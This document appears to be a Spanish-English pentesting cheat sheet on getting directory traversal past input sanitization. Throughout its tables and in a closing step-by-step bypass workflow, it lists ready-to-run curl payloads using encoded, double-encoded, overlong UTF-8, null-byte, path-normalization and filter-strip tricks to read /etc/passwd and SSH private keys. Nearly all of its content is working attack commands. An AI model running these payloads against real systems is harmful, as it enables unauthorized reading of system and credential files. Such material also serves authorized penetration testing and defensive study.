---
aliases:
  - Path Traversal Bypass
  - Null Byte Bypass
  - Filter Strip Bypass
tags:
  - type/technique
  - vuln/path-traversal
  - technique/defense-evasion
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Directory Traversal]]"
---
# Directory Traversal - Bypass de Sanitización

***

## URL Encoding Variants

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?file=..%2fetc%2fpasswd'` | URL-encoded forward slash | Filter blocks `/`. |
| `curl 'https://target/?file=..%5cetc%5cpasswd'` | URL-encoded backslash Windows | Backslash filter. |
| `curl 'https://target/?file=%2e%2e%2fetc%2fpasswd'` | Fully URL-encoded payload | Filter blocks `..`. |
| `curl 'https://target/?file=%2E%2E%2Fetc%2Fpasswd'` | Uppercase hex encoding | Case-sensitive filter. |
| `curl 'https://target/?file=..%252fetc%252fpasswd'` | Double URL encoded `/` → `%252f` | Multi-decode chain. |
| `curl 'https://target/?file=..%255cetc%255cpasswd'` | Double URL encoded `\` | Multi-decode. |
| `curl 'https://target/?file=..%25252fetc%25252fpasswd'` | Triple URL encoded | Multi-layer decode. |
| `curl 'https://target/?file=..%c0%afetc%c0%afpasswd'` | UTF-8 overlong `/` (pre-2010) | Legacy WAF. |
| `curl 'https://target/?file=..%c1%9cetc%c1%9cpasswd'` | UTF-8 overlong `\` | Legacy. |
| `curl 'https://target/?file=..%c0%2fetc%c0%2fpasswd'` | Windows best-fit Unicode mapping | Windows-specific. |
| `curl 'https://target/?file=..\057etc\057passwd'` | Octal escape slash | Edge interpreter. |
| `python3 -c "import urllib.parse as u; print(u.quote(u.quote('../../etc/passwd'),safe=''))"` | DIY double encode | Generator. |
| `curl --data-urlencode "file=../etc/passwd" -G https://target/x` | curl auto-encode helper | Quick encode. |
| `curl 'https://target/?file=..%2f../etc%2fpasswd'` | Mixed plain + encoded | Mixed bypass. |
^pt-bypass-encoding

___

## Null Byte Truncation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?file=../../../etc/passwd%00'` | NUL byte truncate trailing extension | Pre-PHP 5.3.4. |
| `curl 'https://target/?file=../../../etc/passwd%00.png'` | Extension append bypass via NUL | Extension whitelist. |
| `curl 'https://target/?file=../../../etc/passwd%00.html'` | HTML extension append | Same. |
| `curl 'https://target/?file=../../../etc/passwd%2500'` | Double-encoded NUL | Multi-decode. |
| `curl --data-urlencode $'file=../../../etc/passwd\x00.png' -G https://target/x` | Literal NUL via printf escape | Literal byte. |
| `curl 'https://target/?file=test.png%00../../../etc/passwd'` | NUL en medio del param — position varies | Backend split. |
| `python3 -c "import requests; print(requests.get('https://target/?file=../../../etc/passwd\x00.png').text)"` | Python literal NUL request | Programmatic NUL. |
| `curl 'https://target/?file=../../../etc/passwd%00garbage'` | Trailing chars after NUL truncated | Truncate test. |
| `nuclei -t http/vulnerabilities/generic/lfi-detection.yaml -u https://target` | Nuclei LFI NUL probe | Auto detect. |
| `curl 'https://target/?file=..%00/../etc/passwd'` | NUL between traversal dots | Mid-payload NUL. |
| `python3 -c "print('../'*5 + 'etc/passwd' + chr(0) + '.png')" \| xxd` | Verify NUL byte position | Verify. |
^pt-bypass-nullbyte

___

## Path Normalization Differences

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?file=....//etc/passwd'` | Filter strips `../` once → `..//etc/passwd` → OS normalize | Single-pass strip filter. |
| `curl 'https://target/?file=....\/etc\/passwd'` | Backslash + forward slash mix | Mixed strip. |
| `curl 'https://target/?file=....\\etc\\passwd'` | Windows variant collapsed dots | Windows. |
| `curl 'https://target/?file=..;/etc/passwd'` (Tomcat) | Tomcat `..;/` path bypass | Tomcat-specific. |
| `curl 'https://target/?file=..%01/etc/passwd'` | SOH byte after `..` edge | Edge server. |
| `curl 'https://target/?file=./././../../etc/passwd'` | Self-reference + traversal mix | Normalizer fail. |
| `curl 'https://target/?file=//etc/passwd'` (double leading slash) | Double slash variant | Cache distinct. |
| `curl 'https://target/?file=dir/../etc/passwd'` (trailing/middle `..`) | Inline `..` after path segment | Inline bypass. |
| `curl 'https://target/?file=safe/../etc/passwd'` | Trusted prefix concat bypass | Prefix-trust bug. |
| `curl 'https://target/?file=valid_file/../../etc/passwd'` | Per-app trust prefix | Prefix abuse. |
| `curl 'https://target/?file=...%2f...%2f...%2fetc%2fpasswd'` | Triple-dot encoded sequence | Edge strip. |
| `curl 'https://target/?file=%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd'` | All separators encoded | Heavy encode. |
| `curl 'https://target/?file=/.\..\.\../etc/passwd'` | Mixed normalizer confusion | Mixed normalize. |
| `curl 'https://target/?file=..%252f%252e%252e/etc/passwd'` | Double encode mixed | Multi-encode mixed. |
^pt-bypass-normalization

___

## Filter Strip Evasion

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?file=....//....//etc/passwd'` | Recursive strip bypass via doubled `..` | Single-pass filter. |
| `curl 'https://target/?file=/etc/passwd'` | Absolute path no traversal | Filter blocks `..` only. |
| `curl 'https://target/?file=%2e%2e/etc/passwd'` | Encoded `..` | Filter blocks literal `..`. |
| `curl 'https://target/?file=..\etc\passwd'` (backslash) | Backslash variant Linux ignores | Filter blocks `/` only. |
| `curl 'https://target/?file=%2F%2E%2E%2Fetc%2Fpasswd'` | Mixed case encoding | Case-sensitive filter. |
| `curl 'https://target/?file=....\\....\\....\\etc\\passwd'` | Doubled dots Windows variant | Filter strips `..\`. |
| `curl 'https://target/?file=valid/../etc/passwd'` (prefix valid path) | Concat bypass — valid prefix | Trusted prefix concat. |
| `curl 'https://target/?file=~root/.ssh/id_rsa'` (tilde expansion) | Shell tilde expansion | Shell-resolved app. |
| `curl 'https://target/?file=*'` | Glob expansion server-side | Glob-aware app. |
| `curl 'https://target/?file=*.conf'` | Glob match config files | Glob-aware. |
| `curl 'https://target/?file=/dev/null'` (always exists probe) | Probe writeability | Recon probe. |
| `curl 'https://target/?file=/etc/passwd#legit.html'` | Fragment after path ignored server | Fragment trick. |
| `curl 'https://target/?file=/etc/passwd?other=x'` | Trailing query split bypass | App splits on `?`. |
| `curl 'https://target/?file=/etc/passwd%23legit.html'` | Encoded fragment | Encoded variant. |
| `curl 'https://target/?file=$(echo "../etc/passwd" \| base64)'` | Base64 wrap (if decoded server) | Decode-side server. |
| `nuclei -t http/vulnerabilities/lfi/ -u https://target` | Nuclei full LFI template scan | Bulk probe. |
^pt-bypass-strip

### Workflow bypass progresivo

```bash
# 1. Probe básico
curl 'https://target/?file=../../../etc/passwd' | grep -m1 root:

# 2. URL encode si bloqueado
curl 'https://target/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd' | grep -m1 root:

# 3. Double encode
curl 'https://target/?file=%252e%252e%252fetc%252fpasswd' | grep -m1 root:

# 4. Filter strip bypass
curl 'https://target/?file=....//....//etc/passwd' | grep -m1 root:

# 5. Absolute path (sin traversal)
curl 'https://target/?file=/etc/passwd' | grep -m1 root:

# 6. Tomcat trick
curl 'https://target/?file=..;/etc/passwd' | grep -m1 root:

# 7. UTF-8 overlong (legacy)
curl 'https://target/?file=..%c0%afetc%c0%afpasswd' | grep -m1 root:

# 8. NUL byte truncate
curl 'https://target/?file=../../../etc/passwd%00.png' | grep -m1 root:

# 9. Combine — encoded + dot variants
curl 'https://target/?file=....%2f....%2fetc%2fpasswd%00' | grep -m1 root:
```

***
